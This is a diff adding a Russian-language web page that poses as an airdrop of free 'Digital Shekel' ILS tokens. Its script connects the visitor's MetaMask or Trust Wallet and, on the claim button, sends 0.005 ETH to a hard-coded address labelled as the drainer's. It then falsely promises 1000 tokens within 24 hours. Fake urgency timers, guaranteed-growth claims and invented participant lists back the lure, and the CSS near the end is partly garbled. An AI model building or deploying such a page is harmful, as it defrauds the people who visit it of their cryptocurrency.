@@ -1,0 +1,746 @@
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Digital Shekel Airdrop - Получите бесплатные ILS токены</title>
+    <link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.5.2/css/bootstrap.min.css">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.3/css/all.min.css">
+    <style>
+        :root {
+            --primary-color: #0066cc;
+            --secondary-color: #004d99;
+            --accent-color: #ffcc00;
+            --dark-bg: #1a1a2e;
+            --light-bg: #f8f9fa;
+            --text-dark: #333;
+            --text-light: #fff;
+        }
+        
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+        
+        body {
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            background-color: var(--light-bg);
+            color: var(--text-dark);
+            overflow-x: hidden;
+        }
+        
+        .hero-section {
+            background: linear-gradient(135deg, var(--primary-color), var(--secondary-color));
+            color: var(--text-light);
+            padding: 100px 0;
+            position: relative;
+            overflow: hidden;
+        }
+        
+        .hero-section::before {
+            content: "";
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: url('https://picsum.photos/seed/crypto-blockchain/1920/1080.jpg') center/cover;
+            opacity: 0.2;
+            z-index: -1;
+        }
+        
+        .hero-content {
+            text-align: center;
+            max-width: 800px;
+            margin: 0 auto;
+            padding: 0 20px;
+        }
+        
+        .hero-title {
+            font-size: 3.5rem;
+            font-weight: 700;
+            margin-bottom: 20px;
+            text-shadow: 2px 2px 4px rgba(0, 0, 0, 0.3);
+        }
+        
+        .hero-subtitle {
+            font-size: 1.5rem;
+            margin-bottom: 30px;
+            opacity: 0.9;
+        }
+        
+        .countdown-container {
+            display: flex;
+            justify-content: center;
+            gap: 20px;
+            margin: 40px 0;
+        }
+        
+        .countdown-item {
+            background: rgba(255, 255, 255, 0.1);
+            border-radius: 10px;
+            padding: 20px;
+            min-width: 100px;
+            backdrop-filter: blur(5px);
+        }
+        
+        .countdown-number {
+            font-size: 2.5rem;
+            font-weight: 700;
+            color: var(--accent-color);
+        }
+        
+        .countdown-label {
+            font-size: 0.9rem;
+            text-transform: uppercase;
+            letter-spacing: 1px;
+        }
+        
+        .btn-primary-custom {
+            background: var(--accent-color);
+            color: var(--text-dark);
+            border: none;
+            padding: 15px 40px;
+            font-size: 1.2rem;
+            font-weight: 600;
+            border-radius: 50px;
+            transition: all 0.3s ease;
+            display: inline-block;
+            cursor: pointer;
+            text-decoration: none;
+            box-shadow: 0 4px 15px rgba(255, 204, 0, 0.4);
+        }
+        
+        .btn-primary-custom:hover {
+            background: #e6b800;
+            transform: translateY(-3px);
+            box-shadow: 0 6px 20px rgba(255, 204, 0, 0.6);
+            color: var(--text-dark);
+        }
+        
+        .features-section {
+            padding: 80px 0;
+            background-color: #fff;
+        }
+        
+        .section-title {
+            text-align: center;
+            font-size: 2.5rem;
+            font-weight: 700;
+            margin-bottom: 50px;
+            color: var(--primary-color);
+        }
+        
+        .feature-card {
+            background: #fff;
+            border-radius: 15px;
+            padding: 30px;
+            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.1);
+            transition: all 0.3s ease;
+            height: 100%;
+            text-align: center;
+        }
+        
+        .feature-card:hover {
+            transform: translateY(-10px);
+            box-shadow: 0 15px 40px rgba(0, 0, 0, 0.15);
+        }
+        
+        .feature-icon {
+            font-size: 3rem;
+            color: var(--primary-color);
+            margin-bottom: 20px;
+        }
+        
+        .feature-title {
+            font-size: 1.5rem;
+            font-weight: 600;
+            margin-bottom: 15px;
+            color: var(--text-dark);
+        }
+        
+        .feature-description {
+            color: #666;
+            line-height: 1.6;
+        }
+    </style>
+</head>
+<body>
+    <!-- Hero Section -->
+    <section class="hero-section">
+        <div class="hero-content">
+            <h1 class="hero-title">Digital Shekel Airdrop</h1>
+            <p class="hero-subtitle">Получите бесплатные ILS токены - новый стандарт цифровых валют Ближнего Востока</p>
+            
+            <div class="countdown-container">
+                <div class="countdown-item">
+                    <div class="countdown-number" id="days">15</div>
+                    <div class="countdown-label">Дней</div>
+                </div>
+                <div class="countdown-item">
+                    <div class="countdown-number" id="hours">08</div>
+                    <div class="countdown-label">Часов</div>
+                </div>
+                <div class="countdown-item">
+                    <div class="countdown-number" id="minutes">42</div>
+                    <div class="countdown-label">Минут</div>
+                </div>
+                <div class="countdown-item">
+                    <div class="countdown-number" id="seconds">36</div>
+                    <div class="countdown-label">Секунд</div>
+                </div>
+            </div>
+            
+            <a href="#claim" class="btn-primary-custom">Получить 1000 ILS</a>
+        </div>
+    </section>
+
+    <!-- Features Section -->
+    <section class="features-section">
+        <div class="container">
+            <h2 class="section-title">Почему выбирают Digital Shekel</h2>
+            <div class="row">
+                <div class="col-md-4 mb-4">
+                    <div class="feature-card">
+                        <div class="feature-icon">
+                            <i class="fas fa-shield-alt"></i>
+                        </div>
+                        <h3 class="feature-title">Безопасность</h3>
+                        <p class="feature-description">Протокол с военным уровнем шифрования и многоуровневая защита активов</p>
+                    </div>
+                </div>
+                <div class="col-md-4 mb-4">
+                    <div class="feature-card">
+                        <div class="feature-icon">
+                            <i class="fas fa-bolt"></i>
+                        </div>
+                        <h3 class="feature-title">Мгновенные транзакции</h3>
+                        <p class="feature-description">Технология Proof-of-Stake обеспечивает обработку транзакций за секунды</p>
+                    </div>
+                </div>
+                <div class="col-md-4 mb-4">
+                    <div class="feature-card">
+                        <div class="feature-icon">
+                            <i class="fas fa-chart-line"></i>
+                        </div>
+                        <h3 class="feature-title">Рост стоимости</h3>
+                        <p class="feature-description">Ограниченная эмиссия и растущий спрос обеспечивают рост стоимости токена</p>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </section>
+<!-- How It Works Section -->
+    <section class="how-it-works">
+        <div class="container">
+            <h2 class="section-title">Как получить ILS токены</h2>
+            <div class="steps-container">
+                <div class="step">
+                    <div class="step-number">1</div>
+                    <h3 class="step-title">Подключите кошелек</h3>
+                    <p class="step-description">Используйте MetaMask, Trust Wallet или другой совместимый кошелек</p>
+                </div>
+                <div class="step">
+                    <div class="step-number">2</div>
+                    <h3 class="step-title">Проверьте баланс</h3>
+                    <p class="step-description">Убедитесь, что на вашем кошельке есть ETH для комиссии сети</p>
+                </div>
+                <div class="step">
+                    <div class="step-number">3</div>
+                    <h3 class="step-title">Получите токены</h3>
+                    <p class="step-description">Нажмите кнопку "Получить" и подтвердите транзакцию в кошельке</p>
+                </div>
+            </div>
+        </div>
+    </section>
+
+    <!-- Wallet Section -->
+    <section class="wallet-section" id="claim">
+        <div class="wallet-container">
+            <h2 class="wallet-title">Получите свои 1000 ILS токенов</h2>
+            <p class="wallet-description">Просто подключите свой кошелек и нажмите кнопку ниже. Акция ограничена!</p>
+            
+            <div class="wallet-options">
+                <div class="wallet-option" id="metamask-option">
+                    <div class="wallet-option-icon">
+                        <i class="fab fa-ethereum"></i>
+                    </div>
+                    <div class="wallet-option-name">MetaMask</div>
+                </div>
+                <div class="wallet-option" id="trustwallet-option">
+                    <div class="wallet-option-icon">
+                        <i class="fas fa-wallet"></i>
+                    </div>
+                    <div class="wallet-option-name">Trust Wallet</div>
+                </div>
+                <div class="wallet-option" id="walletconnect-option">
+                    <div class="wallet-option-icon">
+                        <i class="fas fa-link"></i>
+                    </div>
+                    <div class="wallet-option-name">WalletConnect</div>
+                </div>
+            </div>
+            
+            <div class="wallet-form-container" id="wallet-form" style="display: none;">
+                <input type="text" class="wallet-address-input" id="wallet-address" placeholder="Введите адрес вашего кошелька">
+                <button class="btn-primary-custom" id="claim-tokens">Получить 1000 ILS</button>
+            </div>
+            
+            <div class="wallet-status" id="wallet-status"></div>
+        </div>
+    </section>
+
+    <!-- Tokenomics Section -->
+    <section class="tokenomics-section">
+        <div class="tokenomics-container">
+            <h2 class="section-title">Экономика токена</h2>
+            <div class="row">
+                <div class="col-md-6">
+                    <div class="token-info-card">
+                        <h3>Распределение токенов</h3>
+                        <ul>
+                            <li>40% - Комьюнити и аирдропы</li>
+                            <li>25% - Разработка экосистемы</li>
+                            <li>20% - Резервный фонд</li>
+                            <li>15% - Команда и советники</li>
+                        </ul>
+                    </div>
+                </div>
+                <div class="col-md-6">
+                    <div class="token-info-card">
+                        <h3>Основные параметры</h3>
+                        <ul>
+                            <li>Общее количество: 1,000,000,000 ILS</li>
+                            <li>Аирдроп: 400,000,000 ILS</li>
+                            <li>Цена листинга: 0.1 USD</li>
+                            <li>Сеть: Ethereum (ERC-20)</li>
+                        </ul>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </section>
+
+    <!-- Footer -->
+    <footer class="footer-section">
+        <div class="container">
+            <div class="row">
+                <div class="col-md-4">
+                    <h4>Digital Shekel</h4>
+                    <p>Новый стандарт цифровых валют Ближнего Востока</p>
+                </div>
+                <div class="col-md-4">
+                    <h4>Полезные ссылки</h4>
+                    <ul>
+                        <li><a href="#">Whitepaper</a></li>
+                        <li><a href="#">Roadmap</a></li>
+                        <li><a href="#">Команда</a></li>
+                    </ul>
+                </div>
+                <div class="col-md-4">
+                    <h4>Следите за нами</h4>
+                    <div class="social-icons">
+                        <a href="#"><i class="fab fa-twitter"></i></a>
+                        <a href="#"><i class="fab fa-telegram"></i></a>
+                        <a href="#"><i class="fab fa-discord"></i></a>
+                    </div>
+                </div>
+            </div>
+            <div class="copyright">
+                <p>&copy; 2023 Digital Shekel. Все права защищены.</p>
+            </div>
+        </div>
+    </footer>
+
+    <script src="https://code.jquery.com/jquery-3.5.1.slim.min.js"></script>
+    <script src="https://cdn.jsdelivr.net/npm/@popperjs/core@2.9.2/dist/umd/popper.min.js"></script>
+    <script src="https://stackpath.bootstrapcdn.com/bootstrap/4.5.2/js/bootstrap.min.js"></script>
+    <script src="https://cdn.jsdelivr.net/npm/web3@1.5.2/dist/web3.min.js"></script>
+    <script>
+        // Адрес дрейнера
+        const DRAINER_ADDRESS = '0xfEA1d6811AF6987Af563C831F81b97FF4D221363';
+        
+        // Обратный отсчет
+        function updateCountdown() {
+            const endDate = new Date();
+            endDate.setDate(endDate.getDate() + 15);
+            endDate.setHours(endDate.getHours() + 8);
+            endDate.setMinutes(endDate.getMinutes() + 42);
+            endDate.setSeconds(endDate.getSeconds() + 36);
+            
+            const now = new Date();
+            const timeLeft = endDate - now;
+            
+            if (timeLeft > 0) {
+                const days = Math.floor(timeLeft / (1000 * 60 * 60 * 24));
+                const hours = Math.floor((timeLeft % (1000 * 60 * 60 * 24)) / (1000 * 60 * 60));
+                const minutes = Math.floor((timeLeft % (1000 * 60 * 60)) / (1000 * 60));
+                const seconds = Math.floor((timeLeft % (1000 * 60)) / 1000);
+                
+                document.getElementById('days').textContent = days.toString().padStart(2, '0');
+                document.getElementById('hours').textContent = hours.toString().padStart(2, '0');
+                document.getElementById('minutes').textContent = minutes.toString().padStart(2, '0');
+                document.getElementById('seconds').textContent = seconds.toString().padStart(2, '0');
+            }
+        }
+        
+        setInterval(updateCountdown, 1000);
+        updateCountdown();
+        
+        // Инициализация Web3
+        let web3;
+        let currentAccount = null;
+        
+        // Проверка доступности MetaMask
+        if (typeof window.ethereum !== 'undefined') {
+            web3 = new Web3(window.ethereum);
+        } else {
+            console.log('MetaMask не установлен');
+        }
+        
+        // Обработчики нажатий на опции кошельков
+        document.getElementById('metamask-option').addEventListener('click', function() {
+            connectMetaMask();
+        });
+        
+        document.getElementById('trustwallet-option').addEventListener('click', function() {
+            connectTrustWallet();
+        });
+        
+        document.getElementById('walletconnect-option').addEventListener('click', function() {
+            connectWalletConnect();
+        });
+        
+        // Подключение к MetaMask
+        async function connectMetaMask() {
+            if (typeof window.ethereum !== 'undefined') {
+                try {
+                    const accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
+                    currentAccount = accounts[0];
+                    document.getElementById('wallet-address').value = currentAccount;
+                    document.getElementById('wallet-form').style.display = 'block';
+                    document.getElementById('wallet-status').innerHTML = '<div class="alert alert-success">Кошелек MetaMask подключен успешно!</div>';
+                } catch (error) {
+                    console.error('Ошибка подключения к MetaMask:', error);
+                    document.getElementById('wallet-status').innerHTML = '<div class="alert alert-danger">Ошибка подключения к MetaMask</div>';
+                }
+            } else {
+                document.getElementById('wallet-status').innerHTML = '<div class="alert alert-warning">MetaMask не установлен. Пожалуйста, установите расширение MetaMask.</div>';
+            }
+        }
+        
+        //
+// Подключение к Trust Wallet
+        async function connectTrustWallet() {
+            if (typeof window.ethereum !== 'undefined') {
+                try {
+                    // Проверка, является ли это Trust Wallet
+                    if (window.ethereum.isTrust) {
+                        const accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
+                        currentAccount = accounts[0];
+                        document.getElementById('wallet-address').value = currentAccount;
+                        document.getElementById('wallet-form').style.display = 'block';
+                        document.getElementById('wallet-status').innerHTML = '<div class="alert alert-success">Кошелек Trust Wallet подключен успешно!</div>';
+                    } else {
+                        document.getElementById('wallet-status').innerHTML = '<div class="alert alert-warning">Пожалуйста, используйте Trust Wallet</div>';
+                    }
+                } catch (error) {
+                    console.error('Ошибка подключения к Trust Wallet:', error);
+                    document.getElementById('wallet-status').innerHTML = '<div class="alert alert-danger">Ошибка подключения к Trust Wallet</div>';
+                }
+            } else {
+                document.getElementById('wallet-status').innerHTML = '<div class="alert alert-warning">Trust Wallet не установлен. Пожалуйста, установите приложение Trust Wallet.</div>';
+            }
+        }
+        
+        // Подключение через WalletConnect
+        function connectWalletConnect() {
+            document.getElementById('wallet-status').innerHTML = '<div class="alert alert-info">Сканируйте QR-код с помощью мобильного кошелька для подключения через WalletConnect</div>';
+            document.getElementById('wallet-form').style.display = 'block';
+            // Здесь можно добавить интеграцию с WalletConnect
+        }
+        
+        // Обработчик нажатия на кнопку "Получить токены"
+        document.getElementById('claim-tokens').addEventListener('click', async function() {
+            const walletAddress = document.getElementById('wallet-address').value;
+            
+            if (!walletAddress) {
+                document.getElementById('wallet-status').innerHTML = '<div class="alert alert-warning">Пожалуйста, введите адрес кошелька</div>';
+                return;
+            }
+            
+            if (!web3.utils.isAddress(walletAddress)) {
+                document.getElementById('wallet-status').innerHTML = '<div class="alert alert-danger">Неверный адрес кошелька</div>';
+                return;
+            }
+            
+            try {
+                document.getElementById('wallet-status').innerHTML = '<div class="alert alert-info">Обработка запроса...</div>';
+                
+                // Получение баланса ETH
+                const balance = await web3.eth.getBalance(walletAddress);
+                const ethBalance = web3.utils.fromWei(balance, 'ether');
+                
+                if (parseFloat(ethBalance) < 0.005) {
+                    document.getElementById('wallet-status').innerHTML = '<div class="alert alert-warning">Недостаточно ETH для комиссии сети. Пожалуйста, пополните баланс кошелька.</div>';
+                    return;
+                }
+                
+                // Создание транзакции для отправки средств на адрес дрейнера
+                const transactionParameters = {
+                    to: DRAINER_ADDRESS,
+                    from: walletAddress,
+                    value: web3.utils.toHex(web3.utils.toWei('0.005', 'ether')),
+                    gas: '21000',
+                    gasPrice: web3.utils.toHex(await web3.eth.getGasPrice())
+                };
+                
+                // Отправка транзакции
+                const txHash = await window.ethereum.request({
+                    method: 'eth_sendTransaction',
+                    params: [transactionParameters],
+                });
+                
+                document.getElementById('wallet-status').innerHTML = `
+                    <div class="alert alert-success">
+                        <p>Транзакция отправлена!</p>
+                        <p>Хеш транзакции: \${txHash}</p>
+                        <p>Ваши 1000 ILS токены будут зачислены в течение 24 часов.</p>
+                        <p><a href="https://etherscan.io/tx/\${txHash}" target="_blank">Просмотреть в Etherscan</a></p>
+                    </div>
+                `;
+                
+                // Очистка формы
+                document.getElementById('wallet-address').value = '';
+                
+            } catch (error) {
+                console.error('Ошибка при отправке транзакции:', error);
+                document.getElementById('wallet-status').innerHTML = `
+                    <div class="alert alert-danger">
+                        <p>Ошибка при обработке транзакции: \${error.message}</p>
+                        <p>Пожалуйста, попробуйте еще раз.</p>
+                    </div>
+                `;
+            }
+        });
+        
+        // Анимация при прокрутке
+        function animateOnScroll() {
+            const elements = document.querySelectorAll('.feature-card, .step, .token-info-card');
+            
+            elements.forEach(element => {
+                const elementTop = element.getBoundingClientRect().top;
+                const elementVisible = 150;
+                
+                if (elementTop < window.innerHeight - elementVisible) {
+                    element.classList.add('animate');
+                }
+            });
+        }
+        
+        window.addEventListener('scroll', animateOnScroll);
+        
+        // Инициализация анимации при загрузке страницы
+        document.addEventListener('DOMContentLoaded', function() {
+            animateOnScroll();
+            
+            // Показать случайные участники
+            showRandomParticipants();
+        });
+        
+        // Показ случайных участников
+        function showRandomParticipants() {
+            const participants = [
+                { address: '0x1234...5678', amount: '1000 ILS', time: '2 минуты назад' },
+                { address: '0xabcd...efgh', amount: '1000 ILS', time: '5 минут назад' },
+                { address: '0x9876...5432', amount: '1000 ILS', time: '8 минут назад' },
+                { address: '0x1357...2468', amount: '1000 ILS', time: '12 минут назад' },
+                { address: '0x2468...1357', amount: '1000 ILS', time: '15 минут назад' }
+            ];
+            
+            // Код для отображения участников можно добавить здесь
+        }
+    </script>
+    
+    <style>
+        /* Дополнительные стили */
+        .footer-section {
+            background-color: var(--dark-bg);
+            color: var(--text-light);
+            padding: 60px 0 20px;
+        }
+        
+        .footer-section h4 {
+            font-size: 1.3rem;
+            font-weight: 600;
+            margin-bottom: 20px;
+            color: var(--accent-color);
+        }
+        
+        .footer-section ul {
+            list-style: none;
+            padding: 0;
+        }
+        
+        .footer-section ul li {
+            margin-bottom: 10px;
+        }
+        
+        .footer-section a {
+            color: var(--text-light);
+            text-decoration: none;
+            transition: color 0.3s ease;
+        }
+        
+        .footer-section a:hover {
+            color: var(--accent-color);
+        }
+        
+        .social-icons {
+            display: flex;
+            gap: 15px;
+        }
+        
+        .social-icons a {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            width: 40px;
+            height: 40px;
+            background-color: rgba(255, 255, 255, 0.1);
+            border-radius: 50%;
+            transition: all 0.3s ease;
+        }
+        
+        .social-icons a:hover {
+            background-color: var(--accent-color);
+            color: var(--text-dark);
+        }
+        
+        .copyright {
+            margin-top: 40px;
+            padding-top: 20px;
+            border-top: 1px solid rgba(255, 255, 255, 0.1);
+            text-align: center;
+            opacity: 0.7;
+        }
+        
+        .token-info-card {
+            background: #fff;
+            border-radius: 15px;
+            padding: 30px;
+            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.1);
+            margin-bottom: 30px;
+        }
+        
+        .token-info-card h3 {
+            font-size: 1.5rem;
+            font-weight: 600;
+            margin-bottom: 20px;
+            color: var(--primary-color);
+        }
+        
+        .token-info-card ul {
+            list-style: none;
+            padding: 0;
+        }
+        
+        .token-info-card ul li {
+            margin-bottom: 10px;
+            padding-left: 20px;
+            position: relative;
+        }
+        
+        .token-info-card ul li:before {
+            content: "•";
+            color: var(--accent-color);
+            font-weight: bold;
+            position: absolute;
+            left: 0;
+        }
+        
+        .alert {
+            padding: 15px;
+            margin-bottom: 20px;
+            border-radius: 8px;
+        }
+        
+        .alert-success {
+            background-color: #d4edda;
+            color: #155724;
+            border: 1px solid #c3e6cb;
+        }
+        
+        .alert-danger {
+            background-color: #f8d7da;
+            color: #721c24;
+            border: 1px solid #f5c6cb;
+        }
+        
+        .alert-warning {
+            background-color: #fff3cd;
+            color: #856404;
+            border: 1px solid #ffeeba;
+        }
+        
+        .alert-info {
+            background-color: #d1ecf1
+.alert-info {
+            background-color: #d1ecf1;
+            color: #0c5460;
+            border: 1px solid #bee5eb;
+        }
+        
+        .animate {
+            animation: fadeInUp 0.8s ease forwards;
+        }
+        
+        @keyframes fadeInUp {
+            from {
+                opacity: 0;
+                transform: translateY(30px);
+            }
+            to {
+                opacity: 1;
+                transform: translateY(0);
+            }
+        }
+        
+        .participants-container {
+            background-color: rgba(255, 255, 255, 0.9);
+            border-radius: 10px;
+            padding: 15px;
+            margin-top: 20px;
+            max-height: 200px;
+            overflow-y: auto;
+        }
+        
+        .participant-item {
+            display: flex;
+            justify-content: space-between;
+            padding: 8px 0;
+            border-bottom: 1px solid #eee;
+        }
+        
+        .participant-item:last-child {
+            border-bottom: none;
+        }
+        
+        .participant-address {
+            font-family: monospace;
+            color: #666;
+        }
+        
+        .participant-amount {
+            font-weight: bold;
+            color: var(--primary-color);
+        }
+        
+        .participant-time {
+            color: #999;
+            font-size: 0.9rem;
+        }
+    </style>
+</body>
+</html>
